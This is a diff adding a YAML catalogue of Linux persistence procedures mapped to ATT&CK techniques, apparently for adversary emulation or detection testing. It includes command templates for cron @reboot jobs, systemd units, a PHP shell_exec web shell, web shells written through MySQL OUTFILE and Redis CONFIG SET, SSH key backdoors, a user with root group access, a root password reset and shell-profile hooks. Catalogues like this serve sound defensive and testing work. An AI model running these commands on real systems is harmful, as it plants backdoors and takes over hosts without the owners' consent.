@@ -1,0 +1,190 @@
+# Cron, services, web shells, keys and accounts: written for the Phase 2 catalogue (spec 2.1).
+attack_version: "20.1"
+procedures:
+  - id: cron-add-reboot
+    technique: T1053.003
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: (crontab -l 2>/dev/null; echo '@reboot /tmp/{{file}}') | crontab -
+  - id: cron-spool-append
+    technique: T1053.003
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '@reboot /tmp/{{file}}' >> /var/spool/cron/crontabs/root
+    ref: ART T1053.003 test 4 Cron - Add script to /var/spool/cron/crontabs/ (2d943c18-e74a-44bf-936f-25ade6cccab4)
+  - id: cron-d-write
+    technique: T1053.003
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}}' > /etc/cron.d/{{file2}}
+    ref: ART T1053.003 test 3 Cron - Add script to /etc/cron.d folder (078e69eb-d9fb-450e-b9d0-2e118217c846)
+  - id: cron-daily-write
+    technique: T1053.003
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}}' > /etc/cron.daily/{{file2}}
+    ref: ART T1053.003 test 2 Cron - Add script to all cron subfolders (b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0)
+  - id: cron-list-jobs
+    technique: T1053.003
+    tactic: TA0007
+    source: corpus
+    protocol: ssh
+    template: crontab -l
+  - id: systemd-write-unit
+    technique: T1543.002
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: printf '[Unit]\nDescription=upd\n[Service]\nExecStart=/tmp/{{file}}\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/{{file2}}.service
+  - id: systemd-enable-unit
+    technique: T1543.002
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: systemctl enable {{file2}}.service
+  - id: systemd-sysv-enable
+    technique: T1543.002
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: service {{file2}} enable
+    ref: ART T1543.002 test 2 Create SysV Service (760fe8d2-79d9-494f-905e-a239a3df86f6)
+  - id: systemd-initd-write
+    technique: T1543.002
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '#!/bin/bash' > /etc/init.d/{{file2}}
+    ref: ART T1543.002 test 3 Create Systemd Service file, Enable, Modify and Reload (c35ac4a8-19de-43af-b9f8-755da7e89c89)
+  - id: webshell-write-php
+    technique: T1505.003
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: echo '<?php echo shell_exec($_GET["c"]); ?>' > /var/www/html/{{file2}}.php
+  - id: webshell-mysql-outfile
+    technique: T1505.003
+    tactic: TA0003
+    source: own
+    protocol: mysql
+    template: SELECT '<?php echo 1; ?>' INTO OUTFILE '/var/www/html/{{file2}}.php'
+  - id: webshell-redis-dbfilename
+    technique: T1505.003
+    tactic: TA0003
+    source: own
+    protocol: redis
+    template: CONFIG SET dbfilename {{file2}}.php
+  - id: webshell-redis-dir
+    technique: T1505.003
+    tactic: TA0003
+    source: own
+    protocol: redis
+    template: CONFIG SET dir /var/www/html
+  - id: sshkeys-append
+    technique: T1098.004
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: echo 'ssh-rsa AAAAB3NzaC1yc2E{{hex}}' >> ~/.ssh/authorized_keys
+  - id: sshkeys-prepare-dir
+    technique: T1098.004
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: mkdir -p ~/.ssh && chmod 700 ~/.ssh
+  - id: sshkeys-replace-dir
+    technique: T1098.004
+    tactic: TA0003
+    source: corpus
+    protocol: ssh
+    template: cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAAD{{hex}}' >> .ssh/authorized_keys && chmod -R go= ~/.ssh
+  - id: sshkeys-rewrite
+    technique: T1098.004
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: if [ -f ~/.ssh/authorized_keys ]; then cat ~/.ssh/authorized_keys > /tmp/{{file}}; fi
+    ref: ART T1098.004 test 1 Modify SSH Authorized Keys (342cc723-127c-4d3a-8292-9c0c6b4ecadc)
+  - id: useradd-shell
+    technique: T1136.001
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: useradd -M -N -r -s /bin/bash {{user}}
+    ref: ART T1136.001 test 1 Create a user account on a Linux system (40d8eabd-e394-46f6-8785-b9bfa1d011d2)
+  - id: useradd-root-uid
+    technique: T1136.001
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: useradd -g 0 -M -d /root -s /bin/bash {{user}}
+    ref: ART T1136.001 test 3 Create a new user in Linux with root UID and GID (a1040a30-d28b-4eda-bd99-bb2861a4616c)
+  - id: useradd-with-password
+    technique: T1136.001
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: useradd {{user}} && echo '{{user}}:{{word}}' | chpasswd
+  - id: useradd-nologin
+    technique: T1136.001
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: pw useradd {{user}} -s /usr/sbin/nologin -d /nonexistent
+    ref: ART T1136.001 test 2 Create a user account on a FreeBSD system (a39ee1bc-b8c1-4331-8e5f-1859eb408518)
+  - id: acct-chpasswd-root
+    technique: T1098
+    tactic: TA0003
+    source: corpus
+    protocol: ssh
+    template: echo 'root:{{word}}'|chpasswd
+  - id: acct-passwd-user
+    technique: T1098
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: passwd {{user}}
+  - id: acct-usermod-sudo
+    technique: T1098
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: usermod -aG sudo {{user}}
+  - id: acct-chage-never
+    technique: T1098
+    tactic: TA0003
+    source: own
+    protocol: ssh
+    template: chage -M 99999 {{user}}
+  - id: rc-bashrc-append
+    technique: T1546.004
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}} &' >> ~/.bashrc
+    ref: ART T1546.004 test 2 Add command to .bashrc (0a898315-4cfa-4007-bafe-33a4646d115f)
+  - id: rc-profile-append
+    technique: T1546.004
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}} &' >> /etc/profile
+    ref: ART T1546.004 test 4 Append to the system shell profile (694b3cc8-6a78-4d35-9e74-0123d009e94b)
+  - id: rc-bashprofile-append
+    technique: T1546.004
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}} &' >> ~/.bash_profile
+    ref: ART T1546.004 test 1 Add command to .bash_profile (94500ae1-7e31-47e3-886b-c328da46872f)
+  - id: rc-profiled-append
+    technique: T1546.004
+    tactic: TA0003
+    source: atomic
+    protocol: ssh
+    template: echo '/tmp/{{file}} &' >> /etc/profile.d/{{file2}}.sh
+    ref: ART T1546.004 test 6 System shell profile scripts (8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4)
